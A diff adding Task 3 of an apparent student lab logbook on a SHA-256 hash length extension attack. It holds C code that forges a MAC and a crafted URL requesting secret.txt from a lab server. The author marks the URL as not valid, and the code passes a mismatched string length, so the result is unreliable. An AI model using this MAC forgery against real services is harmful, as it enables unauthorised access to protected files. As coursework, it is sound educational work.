@@ -69,3 +69,62 @@ Converting to URL enconding, we obtained:
 
 
 #### Task 3
+
+We changed the file according to our attack:
+```
+/* length_ext.c */
+#include <stdio.h>
+#include <arpa/inet.h>
+#include <openssl/sha.h>
+
+int main(int argc, const char *argv[])
+{
+  int i;
+  unsigned char buffer[SHA256_DIGEST_LENGTH];
+  SHA256_CTX c;
+  
+  SHA256_Init(&c);
+  
+  for(i=0; i<64; i++)
+    SHA256_Update(&c, "*", 1);
+    
+  // MAC of the original message M (padded)
+  c.h[0] = htole32(0x1b7ae954);
+  c.h[1] = htole32(0xe7654d0d);
+  c.h[2] = htole32(0xf10f49c0);
+  c.h[3] = htole32(0x01b146bc);
+  c.h[4] = htole32(0xc0034135);
+  c.h[5] = htole32(0x5349f58f);
+  c.h[6] = htole32(0xd7ce0b0e);
+  c.h[7] = htole32(0x79e1d06e);
+  
+  // Append additional message
+  SHA256_Update(&c, "&download=secret.txt", 21);
+  SHA256_Final(buffer, &c);
+  
+  for(i = 0; i < 32; i++) {
+    printf("%02x", buffer[i]);
+  }
+  printf("\n");
+  return 0;
+}
+```
+
+Then we ran the code, obtaining the new MAC for the extended request:
+
+![Image 3](https://git.fe.up.pt/fsi/fsi2425/logs/l05g06/-/raw/main/Images/Task3_LOGBOOK10.png)
+
+Finally, we could build the url to the attack:
+
+- Request from task1
+- PADDING from task2: %80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%01%58
+- MAC from task33: 26c7c61d5a8a35bc29f57436176471b79620ec0912225b56d23b4e8925357594
+
+
+
+NAO TA VALIDO 
+
+http://10.9.0.80/?myname=MariaVieira&uid=1001&lstcmd=1%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%01%58&download=secret.txt&mac=26c7c61d5a8a35bc29f57436176471b79620ec0912225b56d23b4e8925357594
+
+
+
